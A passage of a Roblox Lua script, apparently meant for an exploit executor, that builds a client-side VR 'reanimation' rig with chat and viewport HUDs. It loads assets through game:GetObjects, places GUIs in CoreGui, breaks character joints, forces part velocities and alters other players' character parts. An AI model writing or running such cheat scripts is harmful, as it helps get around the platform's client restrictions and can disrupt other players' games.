			Camera.CameraSubject = VirtualBody.Humanoid
			Character.Humanoid.WalkSpeed = 0
			Character.Humanoid.JumpPower = 1
			for _, Part in next, VirtualBody:GetChildren() do
				if Part:IsA("BasePart") then
					Part.Transparency = 1
				end
			end
			for _, Part in next, VirtualRig:GetChildren() do
				if Part:IsA("BasePart") then
					Part.Transparency = 1
				end
			end
			if not VRReady then
				VirtualRig.RightUpperArm.ShoulderConstraint.RigidityEnabled = true
				VirtualRig.LeftUpperArm.ShoulderConstraint.RigidityEnabled = true
			end
			local OnMoving =
				RunService.Stepped:Connect(
					function()
						local Direction = Character.Humanoid.MoveDirection
						local Start = VirtualBody.HumanoidRootPart.Position
						local Point = Start + Direction * 6
						VirtualBody.Humanoid:MoveTo(Point)
					end
				)
			Character.Humanoid.Jumping:Connect(
				function()
					VirtualBody.Humanoid.Jump = true
				end
			)
			UserInputService.JumpRequest:Connect(
				function()
					VirtualBody.Humanoid.Jump = true
				end
			)
    --[[
 VR Replication
--]]
			if RagdollEnabled then
				for _, Part in pairs(Character:GetDescendants()) do
					if Part:IsA("BasePart") and Part.Name == "Handle" and Part.Parent:IsA("Accessory") then
						Part.LocalTransparencyModifier = 1
					elseif Part:IsA("BasePart") and Part.Transparency < 0.5 and Part.Name ~= "Head" then
						Part.LocalTransparencyModifier = bodyTransparency
					elseif Part:IsA("BasePart") and Part.Name == "Head" then
						Part.LocalTransparencyModifier = 1
					end
					if not Part:IsA("BasePart") and not Part:IsA("AlignPosition") and not Part:IsA("AlignOrientation") then
						pcall(
							function()
								Part.Transparency = 1
							end
						)
						pcall(
							function()
								Part.Enabled = false
							end
						)
					end
				end
			end
			local FootUpdateDebounce = tick()
			local function FloorRay(Part, Distance)
				local Position = Part.CFrame.p
				local Target = Position - Vector3.new(0, Distance, 0)
				local Line = Ray.new(Position, (Target - Position).Unit * Distance)
				local FloorPart, FloorPosition, FloorNormal =
					workspace:FindPartOnRayWithIgnoreList(Line, {VirtualRig, VirtualBody, Character})
				if FloorPart then
					return FloorPart, FloorPosition, FloorNormal, (FloorPosition - Position).Magnitude
				else
					return nil, Target, Vector3.new(), Distance
				end
			end
			local function Flatten(CF)
				local X, Y, Z = CF.X, CF.Y, CF.Z
				local LX, LZ = CF.lookVector.X, CF.lookVector.Z
				return CFrame.new(X, Y, Z) * CFrame.Angles(0, math.atan2(LX, LZ), 0)
			end
			local FootTurn = 1
			local function FootReady(Foot, Target)
				local MaxDist
				if Character.Humanoid.MoveDirection.Magnitude > 0 then
					MaxDist = .5
				else
					MaxDist = 1
				end
				local PastThreshold = (Foot.Position - Target.Position).Magnitude > MaxDist
				local PastTick = tick() - FootUpdateDebounce >= 2
				if PastThreshold or PastTick then
					FootUpdateDebounce = tick()
				end
				return PastThreshold or PastTick
			end
			local function FootYield()
				local RightFooting = VirtualRig.RightFoot.BodyPosition
				local LeftFooting = VirtualRig.LeftFoot.BodyPosition
				local LowerTorso = VirtualRig.LowerTorso
				local Yield = tick()
				repeat
					RunService.Stepped:Wait()
					if
						(LowerTorso.Position - RightFooting.Position).Y > 4 or
						(LowerTorso.Position - LeftFooting.Position).Y > 4 or
						((LowerTorso.Position - RightFooting.Position) * Vector3.new(1, 0, 1)).Magnitude > 4 or
						((LowerTorso.Position - LeftFooting.Position) * Vector3.new(1, 0, 1)).Magnitude > 4
					then
						break
					end
				until tick() - Yield >= .17
			end
			local function UpdateFooting()
				if not VirtualRig:FindFirstChild("LowerTorso") then
					wait()
					return
				end
				local Floor, FloorPosition, FloorNormal, Dist = FloorRay(VirtualRig.LowerTorso, 3)
				Dist = math.clamp(Dist, 0, 5)
				local FootTarget =
					VirtualRig.LowerTorso.CFrame * CFrame.new(FootPlacementSettings.RightOffset) - Vector3.new(0, Dist, 0) +
					Character.Humanoid.MoveDirection * (VirtualBody.Humanoid.WalkSpeed / 8) * 2
				if FootReady(VirtualRig.RightFoot, FootTarget) then
					VirtualRig.RightFoot.BodyPosition.Position = FootTarget.p
					VirtualRig.RightFoot.BodyGyro.CFrame = Flatten(VirtualRig.LowerTorso.CFrame)
				end
				FootYield()
				local FootTarget =
					VirtualRig.LowerTorso.CFrame * CFrame.new(FootPlacementSettings.LeftOffset) - Vector3.new(0, Dist, 0) +
					Character.Humanoid.MoveDirection * (VirtualBody.Humanoid.WalkSpeed / 8) * 2
				if FootReady(VirtualRig.LeftFoot, FootTarget) then
					VirtualRig.LeftFoot.BodyPosition.Position = FootTarget.p
					VirtualRig.LeftFoot.BodyGyro.CFrame = Flatten(VirtualRig.LowerTorso.CFrame)
				end
			end
			local function UpdateTorsoPosition()
				if not RagdollEnabled then
					if TorsoHandle then
						local Positioning = VirtualRig.UpperTorso.CFrame
						if not TorsoGrip or not TorsoGrip.Parent then
							TorsoGrip = CreateRightGrip(TorsoHandle)
						end
						local Parent = TorsoGrip.Parent
						TorsoGrip.C1 = CFrame.new()
						TorsoGrip.C0 =
							TorsoGrip.C0:Lerp(
								WeldBase.CFrame:ToObjectSpace(Positioning * CFrame.new(0, -0.25, 0) * AccessorySettings.LimbOffset),
								Smoothness
							)
						TorsoGrip.Parent = nil
						TorsoGrip.Parent = Parent
					end
				else
					local Positioning = VirtualRig.UpperTorso.CFrame
					MoveTorso(Positioning * CFrame.new(0, -0.25, 0))
					MoveRoot(Positioning * CFrame.new(0, -0.25, 0))
				end
			end
			local function UpdateLegPosition()
				if not RagdollEnabled then
					if RightHipHandle then
						local Positioning =
							VirtualRig.RightLowerLeg.CFrame:Lerp(VirtualRig.RightFoot.CFrame, 0.5) + Vector3.new(0, 0.5, 0)
						if not RightHipHandle or not RightHipHandle.Parent then
							RightLegGrip = CreateRightGrip(RightHipHandle)
						end
						local Parent = RightLegGrip.Parent
						RightLegGrip.C1 = CFrame.new()
						RightLegGrip.C0 =
							RightLegGrip.C0:Lerp(
								WeldBase.CFrame:ToObjectSpace(Positioning * AccessorySettings.LimbOffset),
								Smoothness
							)
						RightLegGrip.Parent = nil
						RightLegGrip.Parent = Parent
					end
					if LeftHipHandle then
						local Positioning =
							VirtualRig.LeftLowerLeg.CFrame:Lerp(VirtualRig.LeftFoot.CFrame, 0.5) + Vector3.new(0, 0.5, 0)
						if not LeftLegGrip or not LeftLegGrip.Parent then
							LeftLegGrip = CreateRightGrip(LeftHipHandle)
						end
						local Parent = LeftLegGrip.Parent
						LeftLegGrip.C1 = CFrame.new()
						LeftLegGrip.C0 =
							LeftLegGrip.C0:Lerp(
								WeldBase.CFrame:ToObjectSpace(Positioning * AccessorySettings.LimbOffset),
								Smoothness
							)
						LeftLegGrip.Parent = nil
						LeftLegGrip.Parent = Parent
					end
				else
					do
						local Positioning =
							VirtualRig.RightLowerLeg.CFrame:Lerp(VirtualRig.RightFoot.CFrame, 0.5) *
							CFrame.Angles(0, math.rad(180), 0) +
							Vector3.new(0, 0.5, 0)
						MoveRightLeg(Positioning)
					end
					do
						local Positioning =
							VirtualRig.LeftLowerLeg.CFrame:Lerp(VirtualRig.LeftFoot.CFrame, 0.5) *
							CFrame.Angles(0, math.rad(180), 0) +
							Vector3.new(0, 0.5, 0)
						MoveLeftLeg(Positioning)
					end
				end
			end
			warn("VRReady is", VRReady)
			local function OnUserCFrameChanged(UserCFrame, Positioning, IgnoreTorso)
				local Positioning = Camera.CFrame * Positioning
				if not IgnoreTorso then
					UpdateTorsoPosition()
					UpdateLegPosition()
				end
				if not RagdollEnabled then
					if UserCFrame == Enum.UserCFrame.Head and AccessorySettings.Head then
						for _, Table in next, HeadAccessories do
							local Handle, RightGrip, HatAtt, HeadAtt, BasePart = unpack(Table)
							local LocalPositioning = Positioning
							if not RightGrip or not RightGrip.Parent then
								RightGrip = CreateRightGrip(Handle)
								Table[2] = RightGrip
							end
							local Parent = RightGrip.Parent
							if BasePart then
								LocalPositioning = BasePart.CFrame * HeadAtt
							end
							RightGrip.C1 = HatAtt
							RightGrip.C0 = RightGrip.C0:Lerp(WeldBase.CFrame:ToObjectSpace(LocalPositioning), Smoothness)
							RightGrip.Parent = nil
							RightGrip.Parent = Parent
						end
					elseif RightHandle and UserCFrame == Enum.UserCFrame.RightHand and AccessorySettings.RightArm then
						local HandPosition = Positioning
						local LocalPositioning = Positioning
						if not RightHandGrip or not RightHandGrip.Parent then
							RightHandGrip = CreateRightGrip(RightHandle)
						end
						if AccurateHandPosition then
							HandPosition = HandPosition * CFrame.new(0, 0, 1)
						end
						if not VRReady then
							local HeadRotation = Camera.CFrame - Camera.CFrame.p
							HandPosition =
								VirtualRig.RightUpperArm.CFrame:Lerp(VirtualRig.RightLowerArm.CFrame, 0.5) *
								AccessorySettings.LimbOffset
							--LocalPositioning = (HeadRotation + (HandPosition * CFrame.new(0, 0, 1)).p) * CFrame.Angles(math.rad(-45), 0, 0)
							LocalPositioning = HandPosition * CFrame.new(0, 0, 1) * CFrame.Angles(math.rad(-180), 0, 0)
							if Point2 then
								VirtualRig.RightUpperArm.Aim.MaxTorque = Vector3.new(math.huge, math.huge, math.huge)
								VirtualRig.RightUpperArm.Aim.CFrame = Camera.CFrame * AccessorySettings.LimbOffset
							elseif VirtualRig.RightUpperArm.Aim.MaxTorque ~= Vector3.new(0, 0, 0) then
								VirtualRig.RightUpperArm.Aim.MaxTorque = Vector3.new(0, 0, 0)
							end
						elseif AccurateHandPosition then
							LocalPositioning = HandPosition
						end
						local Parent = RightHandGrip.Parent
						RightHandGrip.C1 = CFrame.new()
						RightHandGrip.C0 = RightHandGrip.C0:Lerp(WeldBase.CFrame:ToObjectSpace(HandPosition), Smoothness)
						RightHandGrip.Parent = nil
						RightHandGrip.Parent = Parent
						--
						local EquippedTool = GetExtraTool()
						if EquippedTool and EquippedTool:FindFirstChild("Handle") then
							local EquippedGrip = GetGripForHandle(EquippedTool.Handle)
							local Parent = EquippedGrip.Parent
							local ArmBaseCFrame = ArmBase.CFrame
							if ArmBase.Name == "Right Arm" then
								ArmBaseCFrame = ArmBaseCFrame
							end
							EquippedGrip.C1 = EquippedTool.Grip
							EquippedGrip.C0 = EquippedGrip.C0:Lerp(ArmBaseCFrame:ToObjectSpace(LocalPositioning), Smoothness)
							EquippedGrip.Parent = nil
							EquippedGrip.Parent = Parent
						end
					elseif LeftHandle and UserCFrame == Enum.UserCFrame.LeftHand and AccessorySettings.LeftArm then
						local HandPosition = Positioning
						if not LeftHandGrip or not LeftHandGrip.Parent then
							LeftHandGrip = CreateRightGrip(LeftHandle)
						end
						if AccurateHandPosition then
							HandPosition = HandPosition * CFrame.new(0, 0, 1)
						end
						if not VRReady then
							HandPosition =
								VirtualRig.LeftUpperArm.CFrame:Lerp(VirtualRig.LeftLowerArm.CFrame, 0.5) *
								AccessorySettings.LimbOffset
							--warn("Setting HandPosition to hands")
							if Point1 then
								VirtualRig.LeftUpperArm.Aim.MaxTorque = Vector3.new(math.huge, math.huge, math.huge)
								VirtualRig.LeftUpperArm.Aim.CFrame = Camera.CFrame * AccessorySettings.LimbOffset
							elseif VirtualRig.LeftUpperArm.Aim.MaxTorque ~= Vector3.new(0, 0, 0) then
								VirtualRig.LeftUpperArm.Aim.MaxTorque = Vector3.new(0, 0, 0)
							end
						end
						local Parent = LeftHandGrip.Parent
						LeftHandGrip.C1 = CFrame.new()
						LeftHandGrip.C0 = LeftHandGrip.C0:Lerp(WeldBase.CFrame:ToObjectSpace(HandPosition), Smoothness)
						LeftHandGrip.Parent = nil
						LeftHandGrip.Parent = Parent
					end
				end
				if RagdollEnabled then
					if UserCFrame == Enum.UserCFrame.Head and RagdollHeadMovement then
						MoveHead(Positioning)
					elseif UserCFrame == Enum.UserCFrame.RightHand then
						local Positioning = Positioning
						if not VRReady then
							Positioning = VirtualRig.RightUpperArm.CFrame:Lerp(VirtualRig.RightLowerArm.CFrame, 0.5)
						elseif AccurateHandPosition then
							Positioning = Positioning * CFrame.new(0, 0, 1)
						end
						if VRReady then
							Positioning = Positioning * AccessorySettings.LimbOffset
						end
						MoveRightArm(Positioning)
						if Point2 then
							VirtualRig.RightUpperArm.Aim.MaxTorque = Vector3.new(math.huge, math.huge, math.huge)
							VirtualRig.RightUpperArm.Aim.CFrame = Camera.CFrame * AccessorySettings.LimbOffset
						elseif VirtualRig.RightUpperArm.Aim.MaxTorque ~= Vector3.new(0, 0, 0) then
							VirtualRig.RightUpperArm.Aim.MaxTorque = Vector3.new(0, 0, 0)
						end
					elseif UserCFrame == Enum.UserCFrame.LeftHand then
						local Positioning = Positioning
						if not VRReady then
							Positioning = VirtualRig.LeftUpperArm.CFrame:Lerp(VirtualRig.LeftLowerArm.CFrame, 0.5)
						elseif AccurateHandPosition then
							Positioning = Positioning * CFrame.new(0, 0, 1)
						end
						if VRReady then
							Positioning = Positioning * AccessorySettings.LimbOffset
						end
						MoveLeftArm(Positioning)
						if Point1 then
							VirtualRig.LeftUpperArm.Aim.MaxTorque = Vector3.new(math.huge, math.huge, math.huge)
							VirtualRig.LeftUpperArm.Aim.CFrame = Camera.CFrame * AccessorySettings.LimbOffset
						elseif VirtualRig.LeftUpperArm.Aim.MaxTorque ~= Vector3.new(0, 0, 0) then
							VirtualRig.LeftUpperArm.Aim.MaxTorque = Vector3.new(0, 0, 0)
						end
					end
				end
				if UserCFrame == Enum.UserCFrame.Head then
					VirtualRig.Head.CFrame = Positioning
				elseif UserCFrame == Enum.UserCFrame.RightHand and VRReady then
					VirtualRig.RightHand.CFrame = Positioning
				elseif UserCFrame == Enum.UserCFrame.LeftHand and VRReady then
					VirtualRig.LeftHand.CFrame = Positioning
				end
				if not VRReady and VirtualRig.LeftHand.Anchored then
					VirtualRig.RightHand.Anchored = false
					VirtualRig.LeftHand.Anchored = false
				elseif VRReady and not VirtualRig.LeftHand.Anchored then
					VirtualRig.RightHand.Anchored = true
					VirtualRig.LeftHand.Anchored = true
				end
			end
			local CFrameChanged = VRService.UserCFrameChanged:Connect(OnUserCFrameChanged)
			local OnStepped =
				RunService.Stepped:Connect(
					function()
						for _, Part in pairs(VirtualRig:GetChildren()) do
							if Part:IsA("BasePart") then
								Part.CanCollide = false
							end
						end
						if RagdollEnabled then
							for _, Part in pairs(Character:GetChildren()) do
								if Part:IsA("BasePart") then
									Part.CanCollide = false
								end
							end
						end
						if NoCollision then
							for _, Player in pairs(Players:GetPlayers()) do
								if Player ~= Client and Player.Character then
									local Descendants = Player.Character:GetDescendants()
									for i = 1, #Descendants do
										local Part = Descendants[i]
										if Part:IsA("BasePart") then
											Part.CanCollide = false
											Part.Velocity = Vector3.new()
											Part.RotVelocity = Vector3.new()
										end
									end
								end
							end
						end
					end
				)
			local OnRenderStepped =
				RunService.Stepped:Connect(
					function()
						Camera.CameraSubject = VirtualBody.Humanoid
						if RagdollEnabled then
							Character.HumanoidRootPart.CFrame = VirtualRig.UpperTorso.CFrame
							--Character.HumanoidRootPart.Velocity = Vector3.new(0, 0, 0)
						end
						if not VRReady then
							OnUserCFrameChanged(Enum.UserCFrame.Head, CFrame.new(0, 0, 0))
							OnUserCFrameChanged(Enum.UserCFrame.RightHand, CFrame.new(0, 0, 0), true)
							OnUserCFrameChanged(Enum.UserCFrame.LeftHand, CFrame.new(0, 0, 0), true)
						end
					end
				)
			spawn(
				function()
					while Character and Character.Parent do
						FootYield()
						UpdateFooting()
					end
				end
			)
    --[[
 Non-VR Support + VR Mechanics
--]]
			local OnInput =
				UserInputService.InputBegan:Connect(
					function(Input, Processed)
						if not Processed then
							if Input.KeyCode == Enum.KeyCode.LeftControl or Input.KeyCode == Enum.KeyCode.ButtonL2 then
								Tween(
									VirtualBody.Humanoid,
									"Elastic",
									"Out",
									1,
									{
										CameraOffset = Vector3.new(0, StudsOffset - 1.5, 0)
									}
								)
							end
							if Input.KeyCode == Enum.KeyCode.X then
								if RagdollEnabled and RagdollHeadMovement then
									--Network:Unclaim()
									Respawn()
								end
							end
							if Input.KeyCode == Enum.KeyCode.C then
								VirtualBody:MoveTo(Mouse.Hit.p)
								VirtualRig:MoveTo(Mouse.Hit.p)
							end
						end
						if Input.KeyCode == Enum.KeyCode.LeftShift or Input.KeyCode == Enum.KeyCode.ButtonR2 then
							Tween(
								VirtualBody.Humanoid,
								"Sine",
								"Out",
								1,
								{
									WalkSpeed = 16
								}
							)
						end
						if not VRReady and Input.UserInputType == Enum.UserInputType.MouseButton1 then
							Point1 = true
						end
						if not VRReady and Input.UserInputType == Enum.UserInputType.MouseButton2 then
							Point2 = true
						end
						if VRReady and Input.KeyCode == Enum.KeyCode.ButtonY then
							Character:BreakJoints()
							if RagdollEnabled and RagdollHeadMovement then
								--Network:Unclaim()
								Respawn()
							end
						end
					end
				)
			local OnInputEnded =
				UserInputService.InputEnded:Connect(
					function(Input, Processed)
						if not Processed then
							if Input.KeyCode == Enum.KeyCode.LeftControl or Input.KeyCode == Enum.KeyCode.ButtonL2 then
								Tween(
									VirtualBody.Humanoid,
									"Elastic",
									"Out",
									1,
									{
										CameraOffset = Vector3.new(0, StudsOffset, 0)
									}
								)
							end
						end
						if Input.KeyCode == Enum.KeyCode.LeftShift or Input.KeyCode == Enum.KeyCode.ButtonR2 then
							Tween(
								VirtualBody.Humanoid,
								"Sine",
								"Out",
								1,
								{
									WalkSpeed = 8
								}
							)
						end
						if not VRReady and Input.UserInputType == Enum.UserInputType.MouseButton1 then
							Point1 = false
						end
						if not VRReady and Input.UserInputType == Enum.UserInputType.MouseButton2 then
							Point2 = false
						end
					end
				)
    --[[
 Proper Cleanup
--]]
			local OnReset
			OnReset =
				Client.CharacterAdded:Connect(
					function()
						OnReset:Disconnect()
						CFrameChanged:Disconnect()
						OnStepped:Disconnect()
						OnRenderStepped:Disconnect()
						OnMoving:Disconnect()
						OnInput:Disconnect()
						OnInputEnded:Disconnect()
						VirtualRig:Destroy()
						VirtualBody:Destroy()
						if RagdollEnabled then
							--Network:Unclaim()
						end
						if AutoRun then
							delay(
								2,
								function()
									Script()
								end
							)
						end
					end
				)
			if ChatEnabled then
				spawn(ChatHUDFunc)
			end
			if ViewportEnabled then
				spawn(ViewHUDFunc)
			end
			do
        --[[
 Functions
 --]]
				local Players = game:GetService("Players")
				local Client = Players.LocalPlayer
				local VRService = game:GetService("VRService")
				local VRReady = VRService.VREnabled
				local UserInputService = game:GetService("UserInputService")
				local RunService = game:GetService("RunService")
				local Camera = workspace.CurrentCamera
        --[[
 Code
 --]]
				if VRReady then
					local Pointer = game:GetObjects("rbxassetid://4476173280")[1]
					Pointer.Parent = workspace
					Pointer.Beam.Enabled = false
					Pointer.Target.ParticleEmitter.Enabled = false
					local RenderStepped =
						RunService.RenderStepped:Connect(
							function()
								if Pointer.Beam.Enabled then
									local RightHand = Camera.CFrame * VRService:GetUserCFrame(Enum.UserCFrame.RightHand)
									local Target = RightHand * CFrame.new(0, 0, -10)
									local Line = Ray.new(RightHand.p, (Target.p - RightHand.p).Unit * 128)
									local Part, Position =
									workspace:FindPartOnRayWithIgnoreList(Line, {VirtualRig, VirtualBody, Character, Pointer})
									local Distance = (Position - RightHand.p).Magnitude
									Pointer.Target.Position = Vector3.new(0, 0, -Distance)
									Pointer.CFrame = RightHand
								end
							end
						)
					local Input =
						UserInputService.InputBegan:Connect(
							function(Input)
								if Input.KeyCode == Enum.KeyCode.ButtonB then
									Pointer.Beam.Enabled = not Pointer.Beam.Enabled
									Pointer.Target.ParticleEmitter.Enabled = not Pointer.Target.ParticleEmitter.Enabled
								end
							end
						)
					--
					local CharacterAdded
					CharacterAdded =
						Client.CharacterAdded:Connect(
							function()
								RenderStepped:Disconnect()
								Input:Disconnect()
								CharacterAdded:Disconnect()
								Pointer:Destroy()
								Pointer = nil
							end
						)
				else
					return
				end
			end
		end
		Permadeath = function()
			local ch = game.Players.LocalPlayer.Character
			local prt = Instance.new("Model", workspace)
			local z1 = Instance.new("Part", prt)
			z1.Name = "Torso"
			z1.CanCollide = false
			z1.Anchored = true
			local z2 = Instance.new("Part", prt)
			z2.Name = "Head"
			z2.Anchored = true
			z2.CanCollide = false
			local z3 = Instance.new("Humanoid", prt)
			z3.Name = "Humanoid"
			z1.Position = Vector3.new(0, 9999, 0)
			z2.Position = Vector3.new(0, 9991, 0)
			game.Players.LocalPlayer.Character = prt
			wait(game.Players.RespawnTime/2)
			warn("50%")
			game.Players.LocalPlayer.Character = ch
			wait(game.Players.RespawnTime/2 + 0.5)
			warn("100%")
		end
		Respawn = function()
			local ch = game.Players.LocalPlayer.Character
			local prt = Instance.new("Model", workspace)
			local z1 = Instance.new("Part", prt)
			z1.Name = "Torso"
			z1.CanCollide = false
			z1.Anchored = true
			local z2 = Instance.new("Part", prt)
			z2.Name = "Head"
			z2.Anchored = true
			z2.CanCollide = false
			local z3 = Instance.new("Humanoid", prt)
			z3.Name = "Humanoid"
			z1.Position = Vector3.new(0, 9999, 0)
			z2.Position = Vector3.new(0, 9991, 0)
			game.Players.LocalPlayer.Character = prt
			wait(game.Players.RespawnTime)
			game.Players.LocalPlayer.Character = ch
		end
		ChatHUDFunc = function()
    --[[
 Variables
 --]]
			local UserInputService = game:GetService("UserInputService")
			local RunService = game:GetService("RunService")
			local VRService = game:GetService("VRService")
			local VRReady = VRService.VREnabled
			local Players = game:GetService("Players")
			local Client = Players.LocalPlayer
			local ChatHUD = game:GetObjects("rbxassetid://4476067885")[1]
			local GlobalFrame = ChatHUD.GlobalFrame
			local Template = GlobalFrame.Template
			local LocalFrame = ChatHUD.LocalFrame
			local Global = ChatHUD.Global
			local Local = ChatHUD.Local
			local Camera = workspace.CurrentCamera
			Template.Parent = nil
			ChatHUD.Parent = game:GetService("CoreGui")
    --[[
 Code
 --]]
			local Highlight = Global.Frame.BackgroundColor3
			local Deselected = Local.Frame.BackgroundColor3
			local OpenGlobalTab = function()
				Global.Frame.BackgroundColor3 = Highlight
				Local.Frame.BackgroundColor3 = Deselected
				Global.Font = Enum.Font.SourceSansBold
				Local.Font = Enum.Font.SourceSans
				GlobalFrame.Visible = true
				LocalFrame.Visible = false
			end
			local OpenLocalTab = function()
				Global.Frame.BackgroundColor3 = Deselected
				Local.Frame.BackgroundColor3 = Highlight
				Global.Font = Enum.Font.SourceSans
				Local.Font = Enum.Font.SourceSansBold
				GlobalFrame.Visible = false
				LocalFrame.Visible = true
			end
			Global.MouseButton1Down:Connect(OpenGlobalTab)
			Local.MouseButton1Down:Connect(OpenLocalTab)
			Global.MouseButton1Click:Connect(OpenGlobalTab)
			Local.MouseButton1Click:Connect(OpenLocalTab)
			OpenLocalTab()
			--
			local function GetPlayerDistance(Sender)
				if Sender.Character and Sender.Character:FindFirstChild("Head") then
					return math.floor((Sender.Character.Head.Position - Camera:GetRenderCFrame().p).Magnitude + 0.5)
				end
			end
			local function NewGlobal(Message, Sender, Color)
				local Frame = Template:Clone()
				Frame.Text = ("[%s]: %s"):format(Sender.Name, Message)
				Frame.User.Text = ("[%s]:"):format(Sender.Name)
				Frame.User.TextColor3 = Color
				Frame.BackgroundColor3 = Color
				Frame.Parent = GlobalFrame
				delay(
					60,
					function()
						Frame:Destroy()
					end
				)
			end
			local function NewLocal(Message, Sender, Color, Dist)
				local Frame = Template:Clone()
				Frame.Text = ("(%s) [%s]: %s"):format(tostring(Dist), Sender.Name, Message)
				Frame.User.Text = ("(%s) [%s]:"):format(tostring(Dist), Sender.Name)
				Frame.User.TextColor3 = Color
				Frame.BackgroundColor3 = Color
				Frame.Parent = LocalFrame
				delay(
					60,
					function()
						Frame:Destroy()
					end
				)
			end
			local function OnNewChat(Message, Sender, Color)
				if not ChatHUD or not ChatHUD.Parent then
					return
				end
				NewGlobal(Message, Sender, Color)
				local Distance = GetPlayerDistance(Sender)
				if Distance and Distance <= ChatLocalRange then
					NewLocal(Message, Sender, Color, Distance)
				end
			end
			local function OnPlayerAdded(Player)
				if not ChatHUD or not ChatHUD.Parent then
					return
				end
				local Color = BrickColor.Random().Color
				Player.Chatted:Connect(
					function(Message)
						OnNewChat(Message, Player, Color)
					end
				)
			end
			Players.PlayerAdded:Connect(OnPlayerAdded)
			for _, Player in pairs(Players:GetPlayers()) do
				OnPlayerAdded(Player)
			end
			--
			local ChatPart = ChatHUD.Part
			ChatHUD.Adornee = ChatPart
			if VRReady then
				ChatHUD.Parent = game:GetService("CoreGui")
				ChatHUD.Enabled = true
				ChatHUD.AlwaysOnTop = true
				local OnInput =
					UserInputService.InputBegan:Connect(
						function(Input, Processed)
							if not Processed then
								if Input.KeyCode == Enum.KeyCode.ButtonX then
									ChatHUD.Enabled = not ChatHUD.Enabled
								end
							end
						end
					)
				local RenderStepped =
					RunService.RenderStepped:Connect(
						function()
							local LeftHand = VRService:GetUserCFrame(Enum.UserCFrame.LeftHand)
							ChatPart.CFrame = Camera.CFrame * LeftHand
						end
					)
				local CharacterAdded
				CharacterAdded =
					Client.CharacterAdded:Connect(
						function()
							OnInput:Disconnect()
							RenderStepped:Disconnect()
							CharacterAdded:Disconnect()
							ChatHUD:Destroy()
							ChatHUD = nil
						end
					)
			end
			wait(9e9)
		end
		ViewHUDFunc = function()
    --[[
 Variables
 --]]
			local ViewportRange = ViewportRange or 32
			local UserInputService = game:GetService("UserInputService")
			local RunService = game:GetService("RunService")
			local VRService = game:GetService("VRService")
			local VRReady = VRService.VREnabled
			local Players = game:GetService("Players")
			local Client = Players.LocalPlayer
			local Mouse = Client:GetMouse()
			local Camera = workspace.CurrentCamera
			local CameraPort = Camera.CFrame
			local ViewHUD = script:FindFirstChild("ViewHUD") or game:GetObjects("rbxassetid://4480405425")[1]
			local Viewport = ViewHUD.Viewport
			local Viewcam = Instance.new("Camera")
			local ViewPart = ViewHUD.Part
			ViewHUD.Parent = game:GetService("CoreGui")
			Viewcam.Parent = Viewport
			Viewcam.CameraType = Enum.CameraType.Scriptable
			Viewport.CurrentCamera = Viewcam
			Viewport.BackgroundTransparency = 1
    --[[
 Code
 --]]
			local function Clone(Character)
				local Arc = Character.Archivable
				local Clone
				Character.Archivable = true
				Clone = Character:Clone()
				Character.Archivable = Arc
				return Clone
			end
			local function GetPart(Name, Parent, Descendants)
				for i = 1, #Descendants do
					local Part = Descendants[i]
					if Part.Name == Name and Part.Parent.Name == Parent then
						return Part
					end
				end
			end
			local function OnPlayerAdded(Player)
				if not ViewHUD or not ViewHUD.Parent then
					return
				end
				local function CharacterAdded(Character)
					if not ViewHUD or not ViewHUD.Parent then
						return
					end
					Character:WaitForChild("Head")
					Character:WaitForChild("Humanoid")
					wait(3)
					local FakeChar = Clone(Character)
					local Root = FakeChar:FindFirstChild("HumanoidRootPart") or FakeChar:FindFirstChild("Head")
					local RenderConnection
					local Descendants = FakeChar:GetDescendants()
					local RealDescendants = Character:GetDescendants()
					local Correspondents = {}
					FakeChar.Humanoid.DisplayDistanceType = "None"
					for i = 1, #Descendants do
						local Part = Descendants[i]
						local Real = Part:IsA("BasePart") and GetPart(Part.Name, Part.Parent.Name, RealDescendants)
						if Part:IsA("BasePart") and Real then
							Part.Anchored = true
							Part:BreakJoints()
							if Part.Parent:IsA("Accessory") then
								Part.Transparency = 0
							end
							table.insert(Correspondents, {Part, Real})
						end
					end
					RenderConnection =
						RunService.RenderStepped:Connect(
							function()
								if not Character or not Character.Parent then
									RenderConnection:Disconnect()
									FakeChar:Destroy()
									return
								end
								if
									(Root and (Root.Position - Camera.CFrame.p).Magnitude <= ViewportRange) or Player == Client or
									not Root
								then
									for i = 1, #Correspondents do
										local Part, Real = unpack(Correspondents[i])
										if Part and Real and Part.Parent and Real.Parent then
											Part.CFrame = Real.CFrame
										elseif Part.Parent and not Real.Parent then
											Part:Destroy()
										end
									end
								end
							end
						)
					FakeChar.Parent = Viewcam
				end
				Player.CharacterAdded:Connect(CharacterAdded)
				if Player.Character then
					spawn(
						function()
							CharacterAdded(Player.Character)
						end
					)
				end
			end
			local PlayerAdded = Players.PlayerAdded:Connect(OnPlayerAdded)
			for _, Player in pairs(Players:GetPlayers()) do
				OnPlayerAdded(Player)
			end
			ViewPart.Size = Vector3.new()
			if VRReady then
				Viewport.Position = UDim2.new(.62, 0, .89, 0)
				Viewport.Size = UDim2.new(.3, 0, .3, 0)
				Viewport.AnchorPoint = Vector2.new(.5, 1)
			else
				Viewport.Size = UDim2.new(0.3, 0, 0.3, 0)
			end
			local RenderStepped =
				RunService.RenderStepped:Connect(
					function()
						local Render = Camera.CFrame
						local Scale = Camera.ViewportSize
						if VRReady then
							Render = Render * VRService:GetUserCFrame(Enum.UserCFrame.Head)
						end
						CameraPort = CFrame.new(Render.p + Vector3.new(5, 2, 0), Render.p)
						Viewport.Camera.CFrame = CameraPort
						ViewPart.CFrame = Render * CFrame.new(0, 0, -16)
						ViewHUD.Size = UDim2.new(0, Scale.X - 6, 0, Scale.Y - 6)
					end
				)
			--
			local CharacterAdded
			CharacterAdded =
				Client.CharacterAdded:Connect(
					function()
						RenderStepped:Disconnect()
						CharacterAdded:Disconnect()
						PlayerAdded:Disconnect()
						ViewHUD:Destroy()
						ViewHUD = nil
					end
				)

			------------------------Part of modification------------------------
			for i,v in pairs(character1:GetDescendants()) do
				if v:IsA("Motor6D") then
					v:Destroy()
				end
			end

			if character1.Humanoid.RigType == Enum.HumanoidRigType.R15 then
				character1:BreakJoints()
			end

			for i,v in pairs(reanimation:GetChildren()) do
				if v:IsA("BasePart") then
					v.Anchored = false
				end
			end

			game:GetService("RunService").Heartbeat:Connect(function()
				for i,v in pairs(character1:GetChildren()) do
					if v:IsA("BasePart") then
						v.Velocity = Vector3.new(bodyVelocity[1], bodyVelocity[2], bodyVelocity[3])
						if character1.Humanoid.RigType == Enum.HumanoidRigType.R6 then
							v.CFrame = reanimation:FindFirstChild(v.Name).CFrame
						else
							--Head
							if character1:FindFirstChild("Head") then
								character1.Head.CFrame = reanimation.Head.CFrame
							end

							--Torso
							if character1:FindFirstChild("UpperTorso") then
